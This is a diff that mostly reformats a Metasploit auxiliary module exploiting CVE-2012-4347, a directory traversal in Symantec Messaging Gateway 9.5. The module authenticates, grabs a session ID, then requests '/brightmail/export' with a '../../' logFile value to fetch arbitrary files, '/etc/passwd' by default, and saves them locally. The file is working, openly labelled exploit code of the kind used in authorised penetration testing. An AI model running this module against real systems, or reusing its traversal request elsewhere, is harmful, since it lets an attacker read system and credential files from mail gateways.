@@ -1,42 +1,45 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Symantec Messaging Gateway 9.5 Log File Download Vulnerability',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Symantec Messaging Gateway 9.5 Log File Download Vulnerability',
+        'Description' => %q{
           This module will download a file of your choice against Symantec Messaging
-        Gateway.  This is possible by exploiting a directory traversal vulnerability
-        when handling the 'logFile' parameter, which will load an arbitrary file as
-        an attachment.  Note that authentication is required in order to successfully
-        download your file.
-      },
-      'References'     =>
-        [
+          Gateway.  This is possible by exploiting a directory traversal vulnerability
+          when handling the 'logFile' parameter, which will load an arbitrary file as
+          an attachment.  Note that authentication is required in order to successfully
+          download your file.
+        },
+        'References' => [
           ['CVE', '2012-4347'],
           ['EDB', '23110'],
           ['OSVDB', '88165'],
           ['BID', '56789'],
-          ['URL', 'http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120827_00']
+          ['URL', 'https://www.broadcom.com/support/security-center/securityupdates/detail?fid=security_advisory&pvid=security_advisory&suid=20120827_00&year=2012']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Ben Williams <ben.williams[at]ngssecure.com>',
           'sinn3r'
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => "Nov 30 2012"
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2012-11-30',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -44,33 +47,32 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('FILENAME', [true, 'The file to download', '/etc/passwd']),
         OptString.new('USERNAME', [true, 'The username to login as']),
         OptString.new('PASSWORD', [true, 'The password to login with'])
-      ], self.class)
-
-    deregister_options('RHOST')
+      ]
+    )
   end
 
   def auth(username, password, sid, last_login)
     res = send_request_cgi({
-      'method'    => 'POST',
-      'uri'       => '/brightmail/login.do',
-      'headers'   => {
+      'method' => 'POST',
+      'uri' => '/brightmail/login.do',
+      'headers' => {
         'Referer' => "http://#{peer}/brightmail/viewLogin.do"
       },
-      'cookie'    => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}",
+      'cookie' => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}",
       'vars_post' => {
-        'lastlogin'  => last_login,
+        'lastlogin' => last_login,
         'userLocale' => '',
-        'lang'       => 'en_US',
-        'username'   => username,
-        'password'   => password,
-        'loginBtn'   => 'Login'
+        'lang' => 'en_US',
+        'username' => username,
+        'password' => password,
+        'loginBtn' => 'Login'
       }
     })
 
     if res and res.headers['Location']
       new_uri = res.headers['Location'].scan(/^http:\/\/[\d\.]+:\d+(\/.+)/).flatten[0]
       res = send_request_cgi({
-        'uri'    => new_uri,
+        'uri' => new_uri,
         'cookie' => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}"
       })
 
@@ -80,12 +82,11 @@ class MetasploitModule < Msf::Auxiliary
     return false
   end
 
-
   def get_login_data
-    sid        = ''  #From cookie
-    last_login = ''  #A hidden field in the login page
+    sid = '' # From cookie
+    last_login = '' # A hidden field in the login page
 
-    res = send_request_raw({'uri'=>'/brightmail/viewLogin.do'})
+    res = send_request_raw({ 'uri' => '/brightmail/viewLogin.do' })
     if res and !res.get_cookies.empty?
       sid = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || ''
     end
@@ -97,15 +98,14 @@ class MetasploitModule < Msf::Auxiliary
     return sid, last_login
   end
 
-
   def download_file(sid, fname)
     res = send_request_cgi({
-      'uri'      => '/brightmail/export',
-      'cookie'   => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}",
+      'uri' => '/brightmail/export',
+      'cookie' => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}",
       'vars_get' => {
-        'type'        => 'logs',
-        'logFile'     => "../../#{fname}",
-        'logType'     => '1',
+        'type' => 'logs',
+        'logFile' => "../../#{fname}",
+        'logType' => '1',
         'browserType' => '1'
       }
     })
@@ -126,7 +126,6 @@ class MetasploitModule < Msf::Auxiliary
     print_good("File saved as: '#{p}'")
   end
 
-
   def run_host(ip)
     sid, last_login = get_login_data
     if sid.empty? or last_login.empty?
@@ -146,5 +145,4 @@ class MetasploitModule < Msf::Auxiliary
     fname = datastore['FILENAME']
     download_file(sid, fname)
   end
-
 end
